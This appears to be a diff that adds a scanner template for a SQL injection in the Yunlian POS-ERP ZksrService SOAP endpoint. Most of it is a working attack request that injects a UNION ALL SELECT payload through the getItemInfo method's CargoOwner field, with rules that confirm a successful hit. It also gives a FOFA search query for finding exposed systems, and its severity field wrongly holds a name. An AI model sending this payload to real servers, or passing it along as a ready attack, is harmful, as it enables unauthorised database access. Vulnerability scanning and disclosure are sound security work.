@@ -1,0 +1,39 @@
+id: yunlian-pos-erp-zksrservice-sqli
+info:
+  name: Yunlian POS-ERP ZksrService SQL Injection
+  author: nu1r
+  severity: ZacharyZcR
+  description: |
+    Yunlian POS-ERP Management System ZksrService interface has a SQL injection vulnerability.
+    An attacker can execute arbitrary SQL commands through the getItemInfo method.
+    FOFA: title="Powered By chaosZ"
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E4%BA%91%E8%BF%9EPOS-ERP%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E4%BA%91%E8%BF%9EPOS-ERP%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FZksrService%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /services/ZksrService
+      headers:
+        Content-Type: text/xml; charset=UTF-8
+        SOAPAction: ""
+        Accept-Language: zh-CN,zh;q=0.9
+        Accept-Encoding: gzip, deflate
+      body: |
+        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.service.chaosZ.com">
+        <soapenv:Header/>
+            <soapenv:Body>
+                <web:getItemInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+                    <data xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">{"CargoOwner":"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(112)+CHAR(122)+CHAR(120)+CHAR(113),NULL-- qfYz"}
+                    </data>
+                </web:getItemInfo>
+            </soapenv:Body>
+        </soapenv:Envelope>
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'getItemInfoResponse') && 
+      response.headers["Server"].contains("Apache") &&
+      response.headers["Content-Type"].contains("text/xml")
+
+expression: r0()
